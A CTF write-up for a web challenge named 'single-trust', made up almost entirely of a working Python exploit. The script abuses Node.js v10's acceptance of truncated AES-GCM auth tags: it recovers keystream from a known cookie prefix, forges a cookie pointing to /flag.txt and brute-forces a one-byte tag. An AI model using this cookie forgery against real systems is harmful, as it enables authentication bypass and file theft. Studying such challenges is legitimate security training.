# web - single-trust

```
#!/usr/bin/env python3
"""
Exploit for single-trust CTF challenge.

Vulnerability: Node.js v10.19.0 (on ubuntu:20.04) allows truncated GCM auth tags.
A 1-byte auth tag means we only need to brute-force 256 possibilities.

Attack:
1. Get a valid cookie -> extract IV and ciphertext
2. Known plaintext prefix: {"tmpfile":"/tmp/pastestore/ (28 bytes)
3. XOR ct with known prefix to recover keystream bytes 0-27
4. Target plaintext: {"tmpfile":"/flag.txt"} (22 bytes, fits within known keystream)
5. Forge ciphertext: keystream[0:22] XOR target_plaintext
6. Brute-force 1-byte auth tag (256 attempts) with same IV + forged CT
"""

import requests
import base64
import sys
import re
from urllib.parse import unquote

def xor_bytes(a, b):
    return bytes(x ^ y for x, y in zip(a, b))

def exploit(base_url):
    # Step 1: Get a valid cookie
    print("[*] Getting a valid cookie...")
    session = requests.Session()
    resp = session.get(f"{base_url}/")
    cookie = session.cookies.get("auth")
    if not cookie:
        print("[-] Failed to get auth cookie")
        return None
    
    cookie = unquote(cookie)
    print(f"[*] Got cookie: {cookie[:60]}...")
    
    # Step 2: Parse the cookie
    parts = cookie.split(".")
    iv = base64.b64decode(parts[0])
    auth_tag = base64.b64decode(parts[1])
    ct = base64.b64decode(parts[2])
    
    print(f"[*] IV length: {len(iv)}, AuthTag length: {len(auth_tag)}, CT length: {len(ct)}")
    
    # Step 3: Known plaintext prefix (we know at least the first 28 bytes)
    known_prefix = b'{"tmpfile":"/tmp/pastestore/'
    print(f"[*] Known prefix length: {len(known_prefix)}")
    
    # Step 4: Recover keystream from known prefix
    keystream = xor_bytes(ct[:len(known_prefix)], known_prefix)
    
    # Step 5: Target plaintext
    target = b'{"tmpfile":"/flag.txt"}'
    print(f"[*] Target plaintext: {target}")
    print(f"[*] Target length: {len(target)} (within known keystream of {len(known_prefix)} bytes)")
    
    # Step 6: Forge ciphertext
    forged_ct = xor_bytes(keystream[:len(target)], target)
    forged_ct_b64 = base64.b64encode(forged_ct).decode()
    iv_b64 = base64.b64encode(iv).decode()
    
    # Step 7: Brute-force 1-byte auth tag
    print("[*] Brute-forcing 1-byte auth tag (256 attempts)...")
    
    for tag_byte in range(256):
        tag_b64 = base64.b64encode(bytes([tag_byte])).decode()
        forged_cookie = f"{iv_b64}.{tag_b64}.{forged_ct_b64}"
        
        resp = requests.get(f"{base_url}/", cookies={"auth": forged_cookie})
        
        # If we get a new cookie set, it means auth failed (makeAuth was called)
        # If no Set-Cookie, auth succeeded!
        if "set-cookie" not in resp.headers:
            print(f"[+] SUCCESS! Tag byte: 0x{tag_byte:02x}")
            print(f"[+] Forged cookie: {forged_cookie}")
            # Extract flag from response
            body = resp.text
            # The content is inside the textarea
            match = re.search(r'<textarea[^>]*>(.*?)</textarea>', body, re.DOTALL)
            if match:
                content = match.group(1)
                print(f"[+] FLAG: {content}")
                return content
            else:
                print(f"[+] Response body:\n{body}")
                return body
        
        if tag_byte % 32 == 0:
            print(f"[*] Tried {tag_byte}/256...")
    
    print("[-] Failed to find valid tag. This shouldn't happen!")
    return None

if __name__ == "__main__":
    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        target = "http://localhost:8888"
    
    print(f"[*] Targeting: {target}")
    exploit(target)
```

Solved by vicevirus

Solved by: yappare